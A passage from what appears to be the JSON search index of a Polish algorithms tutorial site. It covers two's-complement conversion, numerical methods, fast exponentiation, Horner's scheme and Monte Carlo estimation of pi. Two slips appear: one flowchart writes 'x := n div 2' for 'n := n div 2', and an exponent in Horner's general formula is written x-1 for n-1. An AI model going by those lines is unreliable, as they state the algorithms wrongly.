liczb\u0119 dodatni\u0105, a \\(1\\) oznacza liczb\u0119 ujemn\u0105.</li> <li>Zakres: zakres liczb, kt\u00f3re mo\u017cna reprezentowa\u0107, wynosi od \\(\u2212(2^{n\u22121})\\) do \\(2^{n\u22121}\u22121\\), gdzie \\(n\\) to liczba bit\u00f3w u\u017cytych do reprezentacji liczby.</li> <li>Komplement: aby znale\u017a\u0107 reprezentacj\u0119 liczby ujemnej, bierzemy komplement bitowy (negacj\u0119 wszystkich bit\u00f3w) liczby dodatniej, a nast\u0119pnie dodajemy \\(1\\).</li> </ol>"},{"location":"algorithms/numeral-systems/u2/#konwersja-z-dziesietnego","title":"Konwersja z dziesi\u0119tnego","text":"<p>Istniej\u0105 dwie podstawowe metody konwersji liczby dziesi\u0119tnej na system U2.</p>"},{"location":"algorithms/numeral-systems/u2/#przykad","title":"Przyk\u0142ad","text":"<p>Liczba do konwersji: \\(-102\\) </p> <p>Docelowa liczba bit\u00f3w: \\(8\\) </p>"},{"location":"algorithms/numeral-systems/u2/#metoda-i","title":"Metoda I","text":""},{"location":"algorithms/numeral-systems/u2/#1-konwertujemy-wartosc-bezwzgledna","title":"1. Konwertujemy warto\u015b\u0107 bezwzgl\u0119dn\u0105","text":"div mod 102 0 51 1 25 1 12 0 6 0 3 1 1 1 0 \\[ 102_{10}=1100110_2 \\]"},{"location":"algorithms/numeral-systems/u2/#2-dodajemy-brakujace-bity","title":"2. Dodajemy brakuj\u0105ce bity","text":"\\[ 01100110 \\]"},{"location":"algorithms/numeral-systems/u2/#3-zamieniamy-bity-na-przeciwne","title":"3. Zamieniamy bity na przeciwne","text":"\\[ 10011001 \\]"},{"location":"algorithms/numeral-systems/u2/#4-dodajemy-liczbe-1-do-wyniku","title":"4. Dodajemy liczb\u0119 1 do wyniku","text":"\\[ 10011010 \\]"},{"location":"algorithms/numeral-systems/u2/#5-konwersja-skonczona","title":"5. Konwersja sko\u0144czona","text":"\\[ -102_{10}=10011010_{U2} \\]"},{"location":"algorithms/numeral-systems/u2/#metoda-ii","title":"Metoda II","text":""},{"location":"algorithms/numeral-systems/u2/#1-rozwiazujemy-rownanie","title":"1. Rozwi\u0105zujemy r\u00f3wnanie","text":"\\[ -102=x-128 \\] \\[ x=26 \\]"},{"location":"algorithms/numeral-systems/u2/#2-konwertujemy-wynik-na-system-binarny","title":"2. Konwertujemy wynik na system binarny","text":"div mod 26 0 13 1 6 0 3 1 1 1 0 \\[ 26_{10}=11010_2 \\]"},{"location":"algorithms/numeral-systems/u2/#3-dopisujemy-zera-i-jedynke-z-przodu","title":"3. Dopisujemy zera i jedynk\u0119 z przodu","text":"\\[ 10011010 \\]"},{"location":"algorithms/numeral-systems/u2/#4-konwersja-skonczona","title":"4. Konwersja sko\u0144czona","text":"\\[ 10011010_{U2} \\]"},{"location":"algorithms/numeral-systems/u2/#konwersja-do-dziesietnego","title":"Konwersja do dziesi\u0119tnego","text":"<p>Konwersja z systemu U2 na system dziesi\u0119tny przebiega bardzo podobnie, jak przy konwersji z systemu binarnego. Zasadnicz\u0105 r\u00f3\u017cnic\u0119 stanowi to, w jaki spos\u00f3b traktujemy pierwszy bit. Poniewa\u017c pierwszy bit powi\u0105zany jest ze znakiem liczby, to nie tylko przemna\u017camy go przez odpowiedni\u0105 pot\u0119g\u0119 dw\u00f3jki, ale tak\u017ce przez \\(-1\\).</p>"},{"location":"algorithms/numeral-systems/u2/#przykad-1","title":"Przyk\u0142ad 1","text":"\\[ 10011010_{U2}=2^1+2^3+2^4-2^7=2+8+16-128=26-128=-102_{10} \\]"},{"location":"algorithms/numeral-systems/u2/#przykad-2","title":"Przyk\u0142ad 2","text":"\\[ 00011010_{U2}=2^1+2^3+2^4=2+8+16=26_{10} \\]"},{"location":"algorithms/numeral-systems/u2/#operacje-arytmetyczne","title":"Operacje Arytmetyczne","text":"<p>W systemie U2, dodawanie i odejmowanie mo\u017cna wykonywa\u0107 u\u017cywaj\u0105c zwyk\u0142ych operacji dodawania binarnego i ignoruj\u0105c wszelkie przepe\u0142nienia (nadmiary). W\u0142a\u015bciwo\u015bci tej metody pozwalaj\u0105 na prosty sprz\u0119towy realizm operacji matematycznych, co jest kluczowe w systemach cyfrowych.</p>"},{"location":"algorithms/numeral-systems/u2/#podsumowanie","title":"Podsumowanie","text":"<p>System uzupe\u0142nie\u0144 do dw\u00f3ch jest kluczowym narz\u0119dziem w informatyce, u\u0142atwiaj\u0105cym reprezentacj\u0119 i manipulacj\u0119 liczbami ujemnymi w kontek\u015bcie sprz\u0119towych implementacji operacji arytmetycznych. Jego zrozumienie jest niezb\u0119dne dla os\u00f3b pracuj\u0105cych w dziedzinie system\u00f3w cyfrowych i projektowania uk\u0142ad\u00f3w scalonych.</p>"},{"location":"algorithms/numerical-methods/","title":"Metody numeryczne","text":"<p>Metody numeryczne to techniki umo\u017cliwiaj\u0105ce rozwi\u0105zanie problem\u00f3w matematycznych za pomoc\u0105 algorytm\u00f3w komputerowych. W matematyce istnieje wiele problem\u00f3w, kt\u00f3re nie maj\u0105 rozwi\u0105za\u0144 analitycznych, lub ich rozwi\u0105zania s\u0105 bardzo trudne do uzyskania. W takich przypadkach metody numeryczne oferuj\u0105 przybli\u017cone rozwi\u0105zania.</p>"},{"location":"algorithms/numerical-methods/#podstawowe-metody-numeryczne-i-ich-zastosowania","title":"Podstawowe metody numeryczne i ich zastosowania","text":""},{"location":"algorithms/numerical-methods/#rozwiazywanie-rownan-nieliniowych","title":"Rozwi\u0105zywanie r\u00f3wna\u0144 nieliniowych","text":"<ul> <li>Metoda bisekcji: dzieli przedzia\u0142 na dwie r\u00f3wne cz\u0119\u015bci i wybiera ten, w kt\u00f3rym jest pierwiastek.</li> <li>Metoda Newtona-Raphsona: iteracyjna metoda poszukiwania pierwiastk\u00f3w funkcji.</li> <li>Zastosowanie: odnalezienie pierwiastk\u00f3w r\u00f3wna\u0144, kt\u00f3re s\u0105 niemo\u017cliwe do rozwi\u0105zania analitycznie.</li> </ul>"},{"location":"algorithms/numerical-methods/#cakowanie-numeryczne","title":"Ca\u0142kowanie numeryczne","text":"<ul> <li>Metoda trapez\u00f3w: aproksymuje pole pod krzyw\u0105 jako sum\u0119 p\u00f3l trapez\u00f3w.</li> <li>Metoda Simpsona: u\u017cywa parabol do przybli\u017cenia pola pod krzyw\u0105.</li> <li>Zastosowanie: obliczanie ca\u0142ek funkcji, kt\u00f3re s\u0105 trudne do zintegrowania analitycznie.</li> </ul>"},{"location":"algorithms/numerical-methods/#rozwiazywanie-rownan-rozniczkowych","title":"Rozwi\u0105zywanie r\u00f3wna\u0144 r\u00f3\u017cniczkowych","text":"<ul> <li>Metoda Eulera: prosta metoda iteracyjna do rozwi\u0105zywania r\u00f3wna\u0144 r\u00f3\u017cniczkowych.</li> <li>Metoda Rungego-Kutty: dok\u0142adniejsza metoda rozwi\u0105zania r\u00f3wna\u0144 r\u00f3\u017cniczkowych.</li> <li>Zastosowanie: modelowanie fizyczne, in\u017cynieria, biologia itp.</li> </ul>"},{"location":"algorithms/numerical-methods/#optymalizacja","title":"Optymalizacja","text":"<ul> <li>Algorytm gradientu prostego: iteracyjna metoda poszukiwania minimum funkcji.</li> <li>Zastosowanie: optymalizacja w uczeniu maszynowym, problem minimalizacji w in\u017cynierii.</li> </ul>"},{"location":"algorithms/numerical-methods/#metody-rozwiazywania-ukadow-rownan-liniowych","title":"Metody rozwi\u0105zywania uk\u0142ad\u00f3w r\u00f3wna\u0144 liniowych","text":"<ul> <li>Metoda eliminacji Gaussa: algorytm do znajdowania rozwi\u0105zania uk\u0142ad\u00f3w r\u00f3wna\u0144 liniowych.</li> <li>Metoda Jacobiego: iteracyjna metoda rozwi\u0105zania uk\u0142ad\u00f3w r\u00f3wna\u0144.</li> <li>Zastosowanie: symulacje komputerowe, obliczenia in\u017cynierskie, ekonomia.</li> </ul>"},{"location":"algorithms/numerical-methods/#interpolacja-i-aproksymacja","title":"Interpolacja i aproksymacja","text":"<ul> <li>Interpolacja Lagrange'a: wykorzystuje wielomiany do przybli\u017cenia funkcji.</li> <li>Interpolacja Newtona: inna technika interpolacyjna.</li> <li>Aproksymacja funkcji: aproksymuje funkcj\u0119 za pomoc\u0105 funkcji \u0142atwiejszych do obliczenia.</li> <li>Zastosowanie: obliczenia naukowe, grafika komputerowa.</li> </ul>"},{"location":"algorithms/numerical-methods/#podsumowanie","title":"Podsumowanie","text":"<p>Metody numeryczne odgrywaj\u0105 kluczow\u0105 rol\u0119 w wielu dziedzinach nauki i in\u017cynierii, umo\u017cliwiaj\u0105c rozwi\u0105zanie problem\u00f3w, kt\u00f3re s\u0105 trudne lub niemo\u017cliwe do rozwi\u0105zania za pomoc\u0105 tradycyjnych metod matematycznych. W dobie komputer\u00f3w i zaawansowanego oprogramowania, metody numeryczne staj\u0105 si\u0119 jeszcze bardziej niezb\u0119dne, pozwalaj\u0105c na modelowanie skomplikowanych system\u00f3w oraz uzyskiwanie szybkich i dok\u0142adnych wynik\u00f3w.</p>"},{"location":"algorithms/numerical-methods/fast-exp/","title":"Szybkie pot\u0119gowanie","text":"<p>Zadanie jest proste: mamy podnie\u015b\u0107 liczb\u0119 do zadanej pot\u0119gi. Jak to jednak zwykle bywa, mo\u017cna to zrobi\u0107 na r\u00f3\u017cne sposoby, spo\u015br\u00f3d kt\u00f3rych jedne b\u0119d\u0105 szybsze, a inne wolniejsze. Zacznijmy od przyk\u0142adu.</p> \\[ x^4=x*x*x*x \\] <p>Jak wida\u0107 w powy\u017cszym przyk\u0142adzie, aby podnie\u015b\u0107 \\(x\\) do pot\u0119gi 4, musimy wykona\u0107 3 mno\u017cenia.</p> <p>Zauwa\u017cmy jednak, \u017ce pewne obliczenia b\u0119dziemy wykonywa\u0107 wielokrotnie:</p> \\[ x^4=x^2*x^2 \\] <p>Mo\u017cemy najpierw obliczy\u0107 \\(x^2\\) a nast\u0119pnie wynik podnie\u015b\u0107 do kwadratu:</p> \\[ x^4=(x^2)^2 \\] <p>Jak przeanalizujemy powy\u017cszy przyk\u0142ad to zobaczymy, \u017ce teraz wystarczy wykona\u0107 2 mno\u017cenia!</p> <p>Zobaczmy, \u017ce podobnie post\u0119powa\u0107 mo\u017cemy tak\u017ce z innymi pot\u0119gami, np.:</p> \\[ x^8=(x^4)^2=((x^2)^2)^2 \\] <p>Zamiast oryginalnych 7 mno\u017ce\u0144, wystarczy wykona\u0107 3 mno\u017cenia.</p>"},{"location":"algorithms/numerical-methods/fast-exp/#wykadnik-nieparzysty","title":"Wyk\u0142adnik nieparzysty","text":"<p>Co jednak w sytuacji, gdy wyk\u0142adnik pot\u0119gi nie jest parzysty? Sp\u00f3jrzmy na poni\u017cszy przyk\u0142ad:</p> \\[ x^5=(x^2)^2*x \\]"},{"location":"algorithms/numerical-methods/fast-exp/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/fast-exp/#dane","title":"Dane:","text":"<ul> <li>\\(x\\) \u2014 liczba ca\u0142kowita, podstawa pot\u0119gi</li> <li>\\(n\\) \u2014 liczba naturalna, wyk\u0142adnik pot\u0119gi</li> </ul>"},{"location":"algorithms/numerical-methods/fast-exp/#wynik","title":"Wynik:","text":"<ul> <li>\\(x^n\\)</li> </ul>"},{"location":"algorithms/numerical-methods/fast-exp/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":""},{"location":"algorithms/numerical-methods/fast-exp/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Potega(x, n)\n    1. wynik := 1\n    2. Dop\u00f3ki n &gt; 0, wykonuj:\n        3. Je\u017celi n mod 2 = 1, to:\n            4. wynik := wynik * x\n\n        5. x := x * x\n        6. n := n div 2\n\n    7. Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/numerical-methods/fast-exp/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Potega(x, n)\"]) --&gt; K1[wynik := 1]\n    K1 --&gt; K2{n &gt; 0}\n    K2 -- PRAWDA --&gt; K3{n mod 2 = 1}\n    K3 -- PRAWDA --&gt; K4[wynik := wynik * x]\n    K3 -- FA\u0141SZ --&gt; K5[\"x := x * x\n    x := n div 2\"]\n    K4 --&gt; K5\n    K5 --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K7[/Zwr\u00f3\u0107 wynik/]\n    K7 ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/fast-exp/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\log{n})\\) \u2014 logarytmiczna</p>"},{"location":"algorithms/numerical-methods/fast-exp/#rozwiazanie-rekurencyjne","title":"Rozwi\u0105zanie rekurencyjne","text":""},{"location":"algorithms/numerical-methods/fast-exp/#definicja-rekurencyjna","title":"Definicja rekurencyjna","text":"\\[ \\mathrm{potega}(x,n) = \\begin{cases}     1 &amp; n=0 \\\\     \\mathrm{potega}(x,n\\ \\mathrm{div}\\ 2)^2 &amp; n\\mod 2=0 \\\\     \\mathrm{potega}(x,n\\ \\mathrm{div}\\ 2)^2*x &amp; n\\mod 2=1 \\\\ \\end{cases} \\]"},{"location":"algorithms/numerical-methods/fast-exp/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja Potega(x, n)\n    1. Je\u017celi n = 0, to:\n        2. Zwr\u00f3\u0107 1, zako\u0144cz\n\n    3. wynik := Potega(x, n div 2)\n\n    4. Je\u017celi n mod 2 = 0, to:\n        5. Zwr\u00f3\u0107 wynik * wynik, zako\u0144cz\n\n    6. W przeciwnym przypadku:\n        7. Zwr\u00f3\u0107 wynik * wynik * x, zako\u0144cz\n</code></pre>"},{"location":"algorithms/numerical-methods/fast-exp/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Potega(x, n)\"]) --&gt; K1{n = 0}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 1/]\n    K1 -- FA\u0141SZ --&gt; K3[\"wynik := Potega(x, n div 2)\"]\n    K2 --&gt; STOP\n    K3 --&gt; K4{n mod 2 = 0}\n    K4 -- PRAWDA --&gt; K5[/Zwr\u00f3\u0107 wynik * wynik/]\n    K4 -- FA\u0141SZ --&gt; K7[/Zwr\u00f3\u0107 wynik * wynik * x/]\n    K5 --&gt; STOP([STOP])\n    K7 --&gt; STOP</code></pre>"},{"location":"algorithms/numerical-methods/fast-exp/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\log{n})\\) \u2014 logarytmiczna</p>"},{"location":"algorithms/numerical-methods/fast-exp/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/fast-exp/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/fast-exp/#python","title":"Python","text":""},{"location":"algorithms/numerical-methods/fast-exp/#julia","title":"Julia","text":""},{"location":"algorithms/numerical-methods/horner/","title":"Schemat Hornera","text":"<p>Jak wygl\u0105da wielomian pewnie ka\u017cdy wie. Gdy mamy podany wz\u00f3r, obliczenie jego warto\u015bci dla podanego \\(x\\) jest rzecz\u0105 wr\u0119cz trywialn\u0105: wystarczy wykona\u0107 kilka mno\u017ce\u0144, podnie\u015b\u0107 par\u0119 razy do pot\u0119gi i wszystko zsumowa\u0107. Tym bardziej dla komputera nie powinno to stanowi\u0107 wi\u0119kszego wyzwania i tak rzeczywi\u015bcie jest. Nie oznacza to jednak, \u017ce nie nale\u017cy szuka\u0107 metod pozwalaj\u0105cych na zminimalizowanie wykonywanych operacji. Sp\u00f3jrzmy na konkretny przyk\u0142ad:</p> \\[ W(x) = 2x^3+3x^2+5x+1 \\] <p>Zastan\u00f3wmy si\u0119, ile dok\u0142adnie operacji dodawania i mno\u017cenia musimy wykona\u0107, \u017ceby obliczy\u0107 warto\u015b\u0107 tego wielomianu dla podanego \\(x\\). Spr\u00f3bujmy to rozpisa\u0107:</p> \\[ W(x)=2*x*x*x+3*x*x+5*x+1 \\] <p>Teraz mo\u017cna \u0142atwo policzy\u0107, \u017ce mamy:</p> <ul> <li>6 operacji mno\u017cenia</li> <li>3 operacje dodawania</li> </ul> <p>\u0141\u0105cznie 9 operacji. Czy mo\u017cemy jako\u015b zmniejszy\u0107 ilo\u015b\u0107 wykonywanych operacji? Zauwa\u017cmy, \u017ce niekt\u00f3re pot\u0119gi \\(x\\) obliczamy wielokrotnie. Np. obliczaj\u0105c warto\u015b\u0107 \\(x^3\\) obliczamy \"po drodze\" tak\u017ce warto\u015b\u0107 \\(x^2\\). Spr\u00f3bujmy to wykorzysta\u0107. Gdyby\u015bmy mieli wykona\u0107 obliczenia na komputerze, mogliby\u015bmy utworzy\u0107 zmienne, w kt\u00f3rych zapami\u0119tamy kolejne pot\u0119gi warto\u015bci \\(x\\) , kt\u00f3re p\u00f3\u017aniej wykorzystamy do oblicze\u0144. Mo\u017cemy do tego jednak podej\u015b\u0107 tak\u017ce bardziej matematycznie. Spr\u00f3bujmy wyci\u0105gn\u0105\u0107 \\(x\\) przed nawias.</p> \\[ W(x)=(2*x*x+3*x+5)*x+1 \\] <p>Policzmy, ile teraz wykonujemy operacji:</p> <ul> <li>4 operacje mno\u017cenia</li> <li>3 operacje dodawania</li> </ul> <p>\u0141\u0105cznie 7 operacji, czyli o 2 operacje mniej ni\u017c na pocz\u0105tku! P\u00f3jd\u017amy wi\u0119c o krok dalej.</p> \\[ W(x)=((2*x+3)*x+5)*x+1 \\] <p>Finalnie otrzymujemy:</p> <ul> <li>3 operacje mno\u017cenia</li> <li>3 operacje dodawania</li> </ul> <p>\u0141\u0105cznie 6 operacji, czyli o 3 operacje mniej ni\u017c na pocz\u0105tku. Jak mo\u017cna \u0142atwo zauwa\u017cy\u0107, ilo\u015b\u0107 operacji dodawania nie zmienia si\u0119, jednak mo\u017cemy w \u0142atwy spos\u00f3b zmniejszy\u0107 ilo\u015b\u0107 wymaganych operacji mno\u017cenia.</p> <p>Zastosowany wy\u017cej schemat post\u0119powania nazywamy Schematem Hornera.</p>"},{"location":"algorithms/numerical-methods/horner/#ogolny-wzor","title":"Og\u00f3lny wz\u00f3r","text":"<p>Zauwa\u017cmy, \u017ce warto\u015bci wsp\u00f3\u0142czynnik\u00f3w wielomianu nie maj\u0105 wp\u0142ywu na zastosowanie Schematu Hornera. Mo\u017cemy wi\u0119c \u0142atwo skonstruowa\u0107 og\u00f3lny wz\u00f3r dla wielomianu 3 stopnia:</p> \\[ W(x)=a_3x^3+a_2x^2+a_1x+a_0=((a_3x+a_2)x+a_1)x+a_0 \\] <p>A tak\u017ce og\u00f3lny wz\u00f3r dla wielomianu n-tego stopnia:</p> \\[ W(x)=a_nx^n+a_{n-1}x^{x-1}+...+a_1x+a_0=(...(a_nx+a_{n-1})x+...+a_1)x+a_0 \\]"},{"location":"algorithms/numerical-methods/horner/#liczba-operacji-mnozenia","title":"Liczba operacji mno\u017cenia","text":"<p>Spr\u00f3bujmy policzy\u0107, ile operacji mno\u017cenia musimy wykona\u0107 przy zastosowaniu standardowej metody, dla wielomianu:</p> <ul> <li>1-szego stopnia: \\(1\\) mno\u017cenie</li> <li>2-giego stopnia: \\(1+2=3\\) mno\u017cenia</li> <li>3-go stopnia: \\(1+2+3=6\\) mno\u017ce\u0144</li> <li>n-tego stopnia: \\(1+2+3+...+(n-1)+n=\\frac{n(n+1)}{2}\\) mno\u017ce\u0144</li> </ul> <p>Gdy jednak zastosujemy Schemat Hornera, to ilo\u015b\u0107 potrzebnych operacji mno\u017cenia znacz\u0105co zmaleje:</p> <ul> <li>1-szego stopnia: \\(1\\) mno\u017cenie</li> <li>2-giego stopnia: \\(2\\) mno\u017cenia</li> <li>3-go stopnia: \\(3\\) mno\u017cenia</li> <li>n-tego stopnia: \\(n\\) mno\u017ce\u0144</li> </ul>"},{"location":"algorithms/numerical-methods/horner/#zastosowania","title":"Zastosowania","text":"<p>Schemat Hornera ma tak\u017ce zastosowanie przy przeliczaniu liczby z zadanego systemu liczbowego na system dziesi\u0119tny.</p>"},{"location":"algorithms/numerical-methods/horner/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/horner/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 stopie\u0144 wielomianu, liczba naturalna</li> <li>\\(x\\) \u2014 warto\u015b\u0107, dla kt\u00f3rej nale\u017cy obliczy\u0107 wielomian</li> <li>\\(a_{n}, a_{n-1}, ..., a_1, a_0\\) \u2014 wsp\u00f3\u0142czynniki wielomianu, podane w kolejno\u015bci od najwi\u0119kszej pot\u0119gi do najmniejszej</li> </ul>"},{"location":"algorithms/numerical-methods/horner/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 podanego wielomianu w punkcie \\(x\\)</li> </ul>"},{"location":"algorithms/numerical-methods/horner/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zaprojektujmy funkcje Horner, zgodn\u0105 z powy\u017csz\u0105 specyfikacj\u0105. B\u0119dziemy post\u0119powa\u0107 zgodnie ze schematem: w p\u0119tli mno\u017cymy przez \\(x\\) i dodajemy kolejny wsp\u00f3\u0142czynnik.</p>"},{"location":"algorithms/numerical-methods/horner/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Horner(n, x, a)\n    1. wynik := a[n]\n    2. Od i := n - 1 w d\u00f3\u0142 do 0, wykonuj:\n        3. wynik := wynik * x + a[i]\n    4. Zwr\u00f3\u0107 wynik\n</code></pre>"},{"location":"algorithms/numerical-methods/horner/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Horner(n, x, a)\"]) --&gt; K1[\"wynik := a[n]\n    i := n - 1\"]\n    K1 --&gt; K2{i &gt;= 0}\n    K2 -- PRAWDA --&gt; K3[\"wynik := wynik * x + a[i]\"]\n    K3 --&gt; K2i[i := i - 1]\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K4[/Zwr\u00f3\u0107 wynik/]\n    K4 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/numerical-methods/horner/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/numerical-methods/horner/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/numerical-methods/horner/#c","title":"C++","text":""},{"location":"algorithms/numerical-methods/horner/#python","title":"Python","text":""},{"location":"algorithms/numerical-methods/monte-carlo/","title":"Metoda Monte Carlo","text":"<p>Metoda Monte Carlo to technika matematyczna, kt\u00f3ra pozwala uzyskiwa\u0107 numeryczne rozwi\u0105zania problem\u00f3w przez dokonywanie losowych pr\u00f3b. Jest szeroko stosowana w matematyce, fizyce, finansach i innych dziedzinach nauki. Podstaw\u0105 tej metody jest korzystanie z prawdopodobie\u0144stwa i pr\u00f3bek losowych w celu uzyskania przybli\u017conych wynik\u00f3w do r\u00f3\u017cnych problem\u00f3w. Innymi s\u0142owy, bazuj\u0105c praktycznie wy\u0142\u0105cznie na losowo\u015bci jeste\u015bmy w stanie oszacowa\u0107 wynik postawionego problemu. Rzecz jasna s\u0142owo klucz to oszacowa\u0107. Nie dostaniemy dok\u0142adnego, pe\u0142nego wyniku, ale czasem nam to wystarczy. W szczeg\u00f3lno\u015bci, gdy tak w\u0142a\u015bciwie to nie wiemy, jak obliczy\u0107 dok\u0142adny wynik.</p> <p>Metoda Monte Carlo, jak ju\u017c wspomnia\u0142em, ma r\u00f3\u017cne zastosowania. Poni\u017cej om\u00f3wi\u0119 dwa z nich, skupiaj\u0105c si\u0119 jednak na szacowaniu warto\u015bci liczby \\(\\pi\\). W kontek\u015bcie ca\u0142kowania numerycznego odwo\u0142uj\u0119 zainteresowanych tak\u017ce do metody prostok\u0105t\u00f3w i trapez\u00f3w.</p>"},{"location":"algorithms/numerical-methods/monte-carlo/#cakowanie-numeryczne","title":"Ca\u0142kowanie numeryczne","text":"<p>Metoda Monte Carlo mo\u017ce by\u0107 stosowana do szacowania warto\u015bci ca\u0142ek, zw\u0142aszcza dla funkcji wielu zmiennych, gdzie tradycyjne techniki ca\u0142kowania mog\u0105 by\u0107 skomplikowane.</p> <p>Kolejne kroki algorytmu wygl\u0105daj\u0105 nast\u0119puj\u0105co:</p> <ol> <li>Zak\u0142adamy pewien obszar \\(D\\), w kt\u00f3rym chcemy oszacowa\u0107 ca\u0142k\u0119.</li> <li>Losujemy \\(N\\) punkt\u00f3w wewn\u0105trz obszaru \\(D\\).</li> <li>Obliczamy warto\u015b\u0107 funkcji dla ka\u017cdego z tych punkt\u00f3w.</li> <li>\u015arednia warto\u015b\u0107 funkcji dla tych punkt\u00f3w przemno\u017cona przez rozmiar obszaru \\(D\\) daje szacunkow\u0105 warto\u015b\u0107 ca\u0142ki.</li> </ol> <p>Przy du\u017cych warto\u015bciach \\(N\\) wynik zbli\u017ca si\u0119 do prawdziwej warto\u015bci ca\u0142ki. Trzeba jednak pami\u0119ta\u0107, \u017ce metoda Monte Carlo opiera si\u0119 na losowo\u015bci, a co za tym idzie ma pewn\u0105 wariancj\u0119 i jej dok\u0142adno\u015b\u0107 zale\u017cy od liczby pr\u00f3bek. Zastosowanie wi\u0119kszej liczby pr\u00f3bek zwi\u0119ksza dok\u0142adno\u015b\u0107 wyniku, ale r\u00f3wnie\u017c, co naturalne, zwi\u0119ksza czas oblicze\u0144. Co\u015b za co\u015b.</p>"},{"location":"algorithms/numerical-methods/monte-carlo/#szacowanie-wartosci-liczby-pi","title":"Szacowanie warto\u015bci liczby \\(\\pi\\)","text":"<p>Jednym z popularnych zastosowa\u0144 metody Monte Carlo jest szacowanie warto\u015bci liczby \\(\\pi\\). Pomys\u0142 jest stosunkowo prosty i polega na losowaniu punkt\u00f3w w kwadracie, a nast\u0119pnie sprawdzaniu, ile z tych punkt\u00f3w trafia wewn\u0105trz wpisanego w kwadrat ko\u0142a.</p> <p>Og\u00f3lne kroki algorytmu przedstawiaj\u0105 si\u0119 nast\u0119puj\u0105co:</p> <ol> <li>Zak\u0142adamy kwadrat o boku d\u0142ugo\u015bci \\(2\\), z wpisanym ko\u0142em o promieniu \\(1\\).</li> <li>Losujemy \\(N\\) punkt\u00f3w wewn\u0105trz kwadratu.</li> <li>Liczymy, ile z tych punkt\u00f3w trafi\u0142o do wn\u0119trza ko\u0142a. Mo\u017cemy to zrobi\u0107 poprzez sprawdzenie, czy odleg\u0142o\u015b\u0107 wylosowanego punktu od \u015brodka kwadratu (b\u0119d\u0105cego jednocze\u015bnie \u015brodkiem ko\u0142a) jest mniejsza b\u0105d\u017a r\u00f3wna \\(1\\). Liczb\u0119 takich punkt\u00f3w oznaczymy przez \\(M\\).</li> <li>Stosunek punkt\u00f3w wewn\u0105trz ko\u0142a do wszystkich punkt\u00f3w jest przybli\u017ceniem stosunku pola powierzchni ko\u0142a do pola powierzchni kwadratu. Co za tym idzie: \\(\\pi\\approx 4\\times \\frac{M}{N}\\)</li> </ol> <p>Dok\u0142adno\u015b\u0107 oszacowania zale\u017cy od liczby wylosowanych punkt\u00f3w, ale ze wzgl\u0119du na losowy charakter algorytmu ma pewn\u0105 wariancj\u0119.</p>"},{"location":"algorithms/numerical-methods/monte-carlo/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numerical-methods/monte-carlo/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba pr\u00f3b (im wi\u0119ksza, tym w og\u00f3lno\u015bci wi\u0119ksza dok\u0142adno\u015b\u0107 oszacowania)</li> </ul>"},{"location":"algorithms/numerical-methods/monte-carlo/#wynik","title":"Wynik","text":"<ul> <li>\\(pi\\) \u2014 przybli\u017cona warto\u015b\u0107 liczby \\(\\pi\\)</li> </ul>"},{"location":"algorithms/numerical-methods/monte-carlo/#symulacja","title":"Symulacja","text":"<p>Symulacja Monte Carlo</p>"},{"location":"algorithms/numerical-methods/monte-carlo/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja MonteCarloPI(n)\n    1. wkole := 0\n    2. Dla i := 1 do n, wykonuj:\n        3. x := losowa liczba rzeczywista z przedzia\u0142u [-1, 1]\n        4. y := losowa liczba rzeczywista z przedzia\u0142u [-1, 1]\n        5. odl := (x * x) + (y * y)\n        6. Je\u017celi odl &lt;= 1, to:\n            7. wkole := wkole + 1\n\n    8. Zwr\u00f3\u0107 (4 * wkole) / n\n</code></pre>"},{"location":"algorithms/numerical-methods/monte-carlo/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"MonteCarloPi(n)\"]) --&gt; K1[\"wkole := 0\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= n}\n    K2 -- PRAWDA --&gt; K3[\"x := losowa(-1, 1)\n    y := losowa(-1, 1)\n    odl := x * x + y * y\"]\n    K3 --&gt; K6{odl &lt;= 1}\n    K6 -- PRAWDA --&gt; K7[wkole := wkole + 1]\n    K7 --&gt; K2i[i := i + 1]\n    K6 -- FA\u0141SZ --&gt; K2i\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ ---&gt; K8[/\"Zwr\u00f3\u0107 ((4 * wkole) / n)\"/]\n    K8 ---&gt; 